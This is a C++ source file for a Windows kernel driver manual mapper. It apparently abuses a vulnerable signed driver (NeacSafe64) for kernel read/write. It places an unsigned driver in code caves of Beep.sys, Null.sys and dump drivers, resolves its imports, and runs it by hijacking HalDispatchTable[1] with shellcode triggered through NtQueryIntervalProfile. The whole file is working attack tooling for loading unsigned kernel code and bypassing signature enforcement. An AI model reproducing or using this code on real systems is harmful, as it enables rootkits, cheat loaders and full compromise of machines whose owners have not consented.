#include "Mapper.hpp"
#include "SyscallHijack.hpp"
#include "DriverEntryShellcode.hpp"
#include <fstream>
#include <algorithm>

typedef LONG NTSTATUS;

Mapper::Mapper(NeacInterface* neac) : m_Neac(neac) {}

Mapper::~Mapper() {}

bool Mapper::LoadDriverFile(const std::wstring& path, std::vector<uint8_t>& buffer) {
    HANDLE hFile = CreateFileW(path.c_str(), GENERIC_READ, FILE_SHARE_READ, 
        NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[!] Failed to open driver file (Error: %d)\n", GetLastError());
        return false;
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == INVALID_FILE_SIZE || fileSize == 0) {
        CloseHandle(hFile);
        return false;
    }

    buffer.resize(fileSize);
    DWORD bytesRead;
    if (!ReadFile(hFile, buffer.data(), fileSize, &bytesRead, NULL) || bytesRead != fileSize) {
        CloseHandle(hFile);
        return false;
    }

    CloseHandle(hFile);
    return true;
}

bool Mapper::ValidatePE(const uint8_t* buffer, size_t size) {
    if (size < sizeof(IMAGE_DOS_HEADER)) return false;
    
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)buffer;
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) return false;
    
    if ((size_t)dosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS) > size) return false;
    
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(buffer + dosHeader->e_lfanew);
    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) return false;
    if (ntHeaders->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64) return false;
    if (!(ntHeaders->FileHeader.Characteristics & IMAGE_FILE_EXECUTABLE_IMAGE)) return false;

    return true;
}

size_t Mapper::GetImageSize(const uint8_t* buffer) {
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)buffer;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(buffer + dosHeader->e_lfanew);
    return ntHeaders->OptionalHeader.SizeOfImage;
}

bool Mapper::FindCodeCave(size_t requiredSize, CaveInfo& outCave) {
    // Strategy: Look for large kernel modules with discardable/unused sections
    // Common targets: dump_*.sys, beep.sys, null.sys, or the NeacSafe64 itself
    
    const wchar_t* candidateModules[] = {
        L"dump_diskdump.sys",
        L"dump_dumpfve.sys", 
        L"Beep.SYS",
        L"Null.SYS",
    };

    for (const wchar_t* modName : candidateModules) {
        void* modBase = m_Neac->FindKernelModule(modName);
        if (modBase) {
            if (FindDiscardableSection(modBase, modName, outCave)) {
                if (outCave.Size >= requiredSize) {
                    printf("[+] Found code cave in %ls at %p (size: 0x%zX)\n", 
                        modName, outCave.Address, outCave.Size);
                    return true;
                }
            }
        }
    }

    // Fallback: Use syscall hijack to allocate kernel pool
    printf("[!] No suitable code cave found, attempting syscall hijack pool allocation...\n");
    
    SyscallHijack hijack(m_Neac);
    void* poolAlloc = hijack.AllocateKernelPool(requiredSize + 0x1000);
    if (poolAlloc) {
        printf("[+] Allocated kernel pool at %p via syscall hijack\n", poolAlloc);
        outCave.Address = poolAlloc;
        outCave.Size = requiredSize + 0x1000;
        outCave.ModuleName = L"[Pool Allocation]";
        return true;
    }
    
    // Legacy fallback: Try to find pool allocator (won't work without execution)
    void* pExAllocatePool = m_Neac->GetKernelExport("ExAllocatePool2");
    if (!pExAllocatePool) {
        pExAllocatePool = m_Neac->GetKernelExport("ExAllocatePoolWithTag");
    }
    
    if (!pExAllocatePool) {
        printf("[!] Could not find pool allocation function\n");
        return false;
    }
    
    printf("[+] Found pool allocator at %p\n", pExAllocatePool);
    printf("[!] Syscall hijack failed and direct pool allocation requires execution primitive\n");
    return false;
}

bool Mapper::FindDiscardableSection(void* moduleBase, const wchar_t* moduleName, CaveInfo& outCave) {
    // Read DOS header
    IMAGE_DOS_HEADER dosHeader;
    if (!m_Neac->KernelRead(&dosHeader, moduleBase, sizeof(dosHeader))) {
        return false;
    }
    if (dosHeader.e_magic != IMAGE_DOS_SIGNATURE) return false;

    // Read NT headers
    IMAGE_NT_HEADERS64 ntHeaders;
    void* ntAddr = (uint8_t*)moduleBase + dosHeader.e_lfanew;
    if (!m_Neac->KernelRead(&ntHeaders, ntAddr, sizeof(ntHeaders))) {
        return false;
    }
    if (ntHeaders.Signature != IMAGE_NT_SIGNATURE) return false;

    // Read section headers
    void* sectionAddr = (uint8_t*)ntAddr + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER) + 
        ntHeaders.FileHeader.SizeOfOptionalHeader;
    
    for (WORD i = 0; i < ntHeaders.FileHeader.NumberOfSections; i++) {
        IMAGE_SECTION_HEADER section;
        if (!m_Neac->KernelRead(&section, (uint8_t*)sectionAddr + i * sizeof(IMAGE_SECTION_HEADER), 
            sizeof(section))) {
            continue;
        }

        // Look for DISCARDABLE, INIT, or PAGE sections that might have unused space
        char sectionName[9] = {0};
        memcpy(sectionName, section.Name, 8);
        
        bool isDiscardable = (section.Characteristics & IMAGE_SCN_MEM_DISCARDABLE) != 0;
        bool isInit = (strncmp(sectionName, "INIT", 4) == 0);
        bool isPage = (strncmp(sectionName, "PAGE", 4) == 0);
        
        if (isDiscardable || isInit) {
            size_t actualSize = section.SizeOfRawData;
            if (actualSize > 0x1000) { // At least 4KB
                outCave.Address = (uint8_t*)moduleBase + section.VirtualAddress;
                outCave.Size = actualSize;
                outCave.ModuleName = moduleName;
                printf("[*] Found section '%s' in %ls (VA: 0x%X, Size: 0x%X)\n",
                    sectionName, moduleName, section.VirtualAddress, section.SizeOfRawData);
                return true;
            }
        }
    }

    return false;
}

bool Mapper::CopySections(const uint8_t* buffer, void* targetBase) {
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)buffer;
    PIMAGE_NT_HEADERS64 ntHeaders = (PIMAGE_NT_HEADERS64)(buffer + dosHeader->e_lfanew);
    
    // Copy headers
    if (!m_Neac->KernelWrite(targetBase, (void*)buffer, ntHeaders->OptionalHeader.SizeOfHeaders)) {
        printf("[!] Failed to write PE headers\n");
        return false;
    }
    
    // Copy sections
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
    for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++, section++) {
        if (section->SizeOfRawData == 0) continue;
        
        void* destAddr = (uint8_t*)targetBase + section->VirtualAddress;
        const uint8_t* srcData = buffer + section->PointerToRawData;
        
        // Write in chunks to avoid large single writes
        size_t remaining = section->SizeOfRawData;
        size_t offset = 0;
        const size_t chunkSize = 0x1000;
        
        while (remaining > 0) {
            size_t writeSize = min(remaining, chunkSize);
            if (!m_Neac->KernelWrite((uint8_t*)destAddr + offset, 
                (void*)(srcData + offset), (uint32_t)writeSize)) {
                printf("[!] Failed to write section %d at offset 0x%zX\n", i, offset);
                return false;
            }
            offset += writeSize;
            remaining -= writeSize;
        }
        
        char name[9] = {0};
        memcpy(name, section->Name, 8);
        printf("[+] Mapped section '%s' to %p (size: 0x%X)\n", 
            name, destAddr, section->SizeOfRawData);
    }
    
    return true;
}

bool Mapper::ProcessRelocations(const uint8_t* buffer, void* targetBase) {
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)buffer;
    PIMAGE_NT_HEADERS64 ntHeaders = (PIMAGE_NT_HEADERS64)(buffer + dosHeader->e_lfanew);
    
    ULONGLONG delta = (ULONGLONG)targetBase - ntHeaders->OptionalHeader.ImageBase;
    if (delta == 0) {
        printf("[+] No relocations needed (loaded at preferred base)\n");
        return true;
    }
    
    IMAGE_DATA_DIRECTORY relocDir = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    if (relocDir.VirtualAddress == 0 || relocDir.Size == 0) {
        printf("[!] No relocation table found\n");
        return false;
    }
    
    const uint8_t* relocBase = buffer + relocDir.VirtualAddress;
    const uint8_t* relocEnd = relocBase + relocDir.Size;
    
    while (relocBase < relocEnd) {
        PIMAGE_BASE_RELOCATION block = (PIMAGE_BASE_RELOCATION)relocBase;
        if (block->SizeOfBlock == 0) break;
        
        DWORD numEntries = (block->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
        WORD* entries = (WORD*)(relocBase + sizeof(IMAGE_BASE_RELOCATION));
        
        for (DWORD i = 0; i < numEntries; i++) {
            WORD type = entries[i] >> 12;
            WORD offset = entries[i] & 0xFFF;
            
            if (type == IMAGE_REL_BASED_DIR64) {
                void* patchAddr = (uint8_t*)targetBase + block->VirtualAddress + offset;
                ULONGLONG value;
                
                if (!m_Neac->KernelRead(&value, patchAddr, sizeof(value))) {
                    printf("[!] Failed to read relocation at %p\n", patchAddr);
                    return false;
                }
                
                value += delta;
                
                if (!m_Neac->KernelWrite(patchAddr, &value, sizeof(value))) {
                    printf("[!] Failed to write relocation at %p\n", patchAddr);
                    return false;
                }
            }
        }
        
        relocBase += block->SizeOfBlock;
    }
    
    printf("[+] Processed relocations (delta: 0x%llX)\n", delta);
    return true;
}

void* Mapper::GetKernelProcAddress(const char* moduleName, const char* funcName) {
    // For ntoskrnl exports
    if (_stricmp(moduleName, "ntoskrnl.exe") == 0 || _stricmp(moduleName, "ntkrnlpa.exe") == 0) {
        return m_Neac->GetKernelExport(funcName);
    }
    
    // For other kernel modules, find them and parse their exports
    wchar_t wModuleName[260];
    MultiByteToWideChar(CP_ACP, 0, moduleName, -1, wModuleName, 260);
    
    void* modBase = m_Neac->FindKernelModule(wModuleName);
    if (!modBase) {
        printf("[!] Module not found: %s\n", moduleName);
        return nullptr;
    }
    
    // Read and parse export directory from kernel memory
    IMAGE_DOS_HEADER dosHeader;
    if (!m_Neac->KernelRead(&dosHeader, modBase, sizeof(dosHeader))) return nullptr;
    
    IMAGE_NT_HEADERS64 ntHeaders;
    if (!m_Neac->KernelRead(&ntHeaders, (uint8_t*)modBase + dosHeader.e_lfanew, sizeof(ntHeaders))) 
        return nullptr;
    
    IMAGE_DATA_DIRECTORY exportDir = ntHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (exportDir.VirtualAddress == 0) return nullptr;
    
    IMAGE_EXPORT_DIRECTORY expDir;
    void* expDirAddr = (uint8_t*)modBase + exportDir.VirtualAddress;
    if (!m_Neac->KernelRead(&expDir, expDirAddr, sizeof(expDir))) return nullptr;
    
    // Read export tables
    std::vector<DWORD> nameRvas(expDir.NumberOfNames);
    std::vector<WORD> ordinals(expDir.NumberOfNames);
    std::vector<DWORD> funcRvas(expDir.NumberOfFunctions);
    
    m_Neac->KernelRead(nameRvas.data(), (uint8_t*)modBase + expDir.AddressOfNames, 
        expDir.NumberOfNames * sizeof(DWORD));
    m_Neac->KernelRead(ordinals.data(), (uint8_t*)modBase + expDir.AddressOfNameOrdinals,
        expDir.NumberOfNames * sizeof(WORD));
    m_Neac->KernelRead(funcRvas.data(), (uint8_t*)modBase + expDir.AddressOfFunctions,
        expDir.NumberOfFunctions * sizeof(DWORD));
    
    for (DWORD i = 0; i < expDir.NumberOfNames; i++) {
        char name[256] = {0};
        m_Neac->KernelRead(name, (uint8_t*)modBase + nameRvas[i], sizeof(name) - 1);
        if (_stricmp(name, funcName) == 0) {
            return (uint8_t*)modBase + funcRvas[ordinals[i]];
        }
    }
    
    return nullptr;
}

bool Mapper::ResolveImports(const uint8_t* buffer, void* targetBase) {
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)buffer;
    PIMAGE_NT_HEADERS64 ntHeaders = (PIMAGE_NT_HEADERS64)(buffer + dosHeader->e_lfanew);
    
    IMAGE_DATA_DIRECTORY importDir = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (importDir.VirtualAddress == 0) {
        printf("[+] No imports to resolve\n");
        return true;
    }
    
    PIMAGE_IMPORT_DESCRIPTOR importDesc = (PIMAGE_IMPORT_DESCRIPTOR)(buffer + importDir.VirtualAddress);
    
    while (importDesc->Name != 0) {
        const char* moduleName = (const char*)(buffer + importDesc->Name);
        printf("[*] Processing imports from: %s\n", moduleName);
        
        PIMAGE_THUNK_DATA64 origThunk = (PIMAGE_THUNK_DATA64)(buffer + importDesc->OriginalFirstThunk);
        PIMAGE_THUNK_DATA64 thunk = (PIMAGE_THUNK_DATA64)(buffer + importDesc->FirstThunk);
        
        size_t thunkIndex = 0;
        while (origThunk->u1.AddressOfData != 0) {
            void* funcAddr = nullptr;
            
            if (origThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG64) {
                // Import by ordinal
                WORD ordinal = (WORD)(origThunk->u1.Ordinal & 0xFFFF);
                printf("[!] Ordinal import not implemented: %d\n", ordinal);
            } else {
                // Import by name
                PIMAGE_IMPORT_BY_NAME importByName = (PIMAGE_IMPORT_BY_NAME)(buffer + origThunk->u1.AddressOfData);
                funcAddr = GetKernelProcAddress(moduleName, importByName->Name);
                
                if (!funcAddr) {
                    printf("[!] Failed to resolve: %s!%s\n", moduleName, importByName->Name);
                    // Continue anyway, some imports might be optional
                } else {
                    printf("[+] Resolved: %s -> %p\n", importByName->Name, funcAddr);
                }
            }
            
            // Write the resolved address to the IAT
            void* iatEntry = (uint8_t*)targetBase + importDesc->FirstThunk + (thunkIndex * sizeof(ULONGLONG));
            ULONGLONG addr = (ULONGLONG)funcAddr;
            if (!m_Neac->KernelWrite(iatEntry, &addr, sizeof(addr))) {
                printf("[!] Failed to write IAT entry\n");
                return false;
            }
            
            origThunk++;
            thunkIndex++;
        }
        
        importDesc++;
    }
    
    printf("[+] Import resolution complete\n");
    return true;
}

bool Mapper::MapDriver(const std::wstring& driverPath, MappedDriver& outDriver) {
    printf("[*] Loading driver file: %ls\n", driverPath.c_str());
    
    // Load file
    std::vector<uint8_t> buffer;
    if (!LoadDriverFile(driverPath, buffer)) {
        return false;
    }
    printf("[+] Driver file loaded (%zu bytes)\n", buffer.size());
    
    // Validate PE
    if (!ValidatePE(buffer.data(), buffer.size())) {
        printf("[!] Invalid PE file\n");
        return false;
    }
    
    // Get image size
    size_t imageSize = GetImageSize(buffer.data());
    printf("[+] Image size: 0x%zX\n", imageSize);
    
    // Find memory cave
    CaveInfo cave;
    if (!FindCodeCave(imageSize, cave)) {
        printf("[!] Failed to find suitable memory location\n");
        printf("[!] Hint: Consider using a dedicated pool allocation driver\n");
        return false;
    }
    
    outDriver.BaseAddress = cave.Address;
    outDriver.ImageSize = imageSize;
    
    // Copy sections
    printf("[*] Copying sections to kernel memory...\n");
    if (!CopySections(buffer.data(), cave.Address)) {
        return false;
    }
    
    // Process relocations
    printf("[*] Processing relocations...\n");
    if (!ProcessRelocations(buffer.data(), cave.Address)) {
        return false;
    }
    
    // Resolve imports
    printf("[*] Resolving imports...\n");
    if (!ResolveImports(buffer.data(), cave.Address)) {
        return false;
    }
    
    // Calculate entry point
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)buffer.data();
    PIMAGE_NT_HEADERS64 ntHeaders = (PIMAGE_NT_HEADERS64)(buffer.data() + dosHeader->e_lfanew);
    outDriver.EntryPoint = (uint8_t*)cave.Address + ntHeaders->OptionalHeader.AddressOfEntryPoint;
    outDriver.Executed = false;
    
    printf("[+] Driver mapped at %p (EP: %p)\n", outDriver.BaseAddress, outDriver.EntryPoint);
    return true;
}

bool Mapper::InstallExecutionHook(void* entryPoint, HookContext& ctx) {
    // Strategy: Overwrite a rarely-called kernel function pointer
    // We'll target HalDispatchTable+0x8 (HaliQuerySystemInformation)
    // which can be triggered via NtQueryIntervalProfile
    
    void* pHalDispatchTable = m_Neac->GetKernelExport("HalDispatchTable");
    if (!pHalDispatchTable) {
        printf("[!] HalDispatchTable not found\n");
        return false;
    }
    
    ctx.HookTarget = (uint8_t*)pHalDispatchTable + 0x8;  // HalDispatchTable[1]
    ctx.PatchSize = sizeof(ULONGLONG);
    
    // Save original value
    if (!m_Neac->KernelRead(ctx.OriginalBytes, ctx.HookTarget, ctx.PatchSize)) {
        printf("[!] Failed to read original HalDispatchTable entry\n");
        return false;
    }
    ctx.OriginalAddress = *(void**)ctx.OriginalBytes;
    
    // Write entry point address
    ULONGLONG epAddr = (ULONGLONG)entryPoint;
    if (!m_Neac->KernelWrite(ctx.HookTarget, &epAddr, sizeof(epAddr))) {
        printf("[!] Failed to write hook\n");
        return false;
    }
    
    printf("[+] Hook installed at HalDispatchTable[1]\n");
    printf("[+] Original: %p -> New: %p\n", ctx.OriginalAddress, entryPoint);
    return true;
}

bool Mapper::TriggerExecution() {
    // Trigger via NtQueryIntervalProfile which calls HalDispatchTable[1]
    typedef NTSTATUS(NTAPI* NtQueryIntervalProfile_t)(ULONG ProfileSource, PULONG Interval);
    
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return false;
    
    NtQueryIntervalProfile_t pNtQueryIntervalProfile = 
        (NtQueryIntervalProfile_t)GetProcAddress(ntdll, "NtQueryIntervalProfile");
    if (!pNtQueryIntervalProfile) return false;
    
    ULONG interval = 0;
    // This will call our hooked function
    // Note: The driver entry point signature doesn't match what HAL expects,
    // so this is a simplified trigger. A proper implementation would need
    // shellcode to bridge the calling convention.
    printf("[*] Triggering execution via NtQueryIntervalProfile...\n");
    pNtQueryIntervalProfile(0, &interval);
    
    return true;
}

bool Mapper::RestoreHook(const HookContext& ctx) {
    if (!m_Neac->KernelWrite(ctx.HookTarget, (void*)ctx.OriginalBytes, (uint32_t)ctx.PatchSize)) {
        printf("[!] Failed to restore hook\n");
        return false;
    }
    printf("[+] Hook restored\n");
    return true;
}

bool Mapper::ExecuteDriverEntry(MappedDriver& driver) {
    if (driver.Executed) {
        printf("[!] Driver already executed\n");
        return false;
    }
    
    // Validate shellcode offsets
    if (!DriverEntryShellcode::ValidateOffsets()) {
        printf("[!] Shellcode offset validation failed\n");
        return false;
    }
    
    // Find a location to place our shellcode wrapper
    // We'll use space after the driver image or find a code cave
    void* shellcodeAddr = (uint8_t*)driver.BaseAddress + driver.ImageSize;
    
    // Prepare shellcode with driver entry address patched
    uint8_t shellcode[DriverEntryShellcode::SHELLCODE_SIZE];
    size_t shellcodeSize = DriverEntryShellcode::GetPatchedShellcode(shellcode, driver.EntryPoint);
    
    printf("[*] Writing shellcode wrapper at %p (size: %zu)\n", shellcodeAddr, shellcodeSize);
    printf("[*] Shellcode will call DriverEntry at %p\n", driver.EntryPoint);
    
    // Write shellcode to kernel memory
    if (!m_Neac->KernelWrite(shellcodeAddr, shellcode, (uint32_t)shellcodeSize)) {
        printf("[!] Failed to write shellcode\n");
        return false;
    }
    
    // Install HAL dispatch table hook pointing to our shellcode (not raw DriverEntry)
    HookContext ctx = {0};
    if (!InstallExecutionHook(shellcodeAddr, ctx)) {
        return false;
    }
    
    // Trigger execution
    printf("[*] Triggering driver initialization...\n");
    TriggerExecution();
    
    // Restore hook immediately
    RestoreHook(ctx);
    
    driver.Executed = true;
    printf("[+] Driver entry executed successfully\n");
    
    return true;
}

bool Mapper::UnmapDriver(MappedDriver& driver) {
    // Zero out the mapped memory
    std::vector<uint8_t> zeros(driver.ImageSize, 0);
    
    size_t remaining = driver.ImageSize;
    size_t offset = 0;
    const size_t chunkSize = 0x1000;
    
    while (remaining > 0) {
        size_t writeSize = min(remaining, chunkSize);
        m_Neac->KernelWrite((uint8_t*)driver.BaseAddress + offset, zeros.data(), (uint32_t)writeSize);
        offset += writeSize;
        remaining -= writeSize;
    }
    
    printf("[+] Driver memory zeroed\n");
    driver.BaseAddress = nullptr;
    driver.ImageSize = 0;
    driver.EntryPoint = nullptr;
    driver.Executed = false;
    
    return true;
}
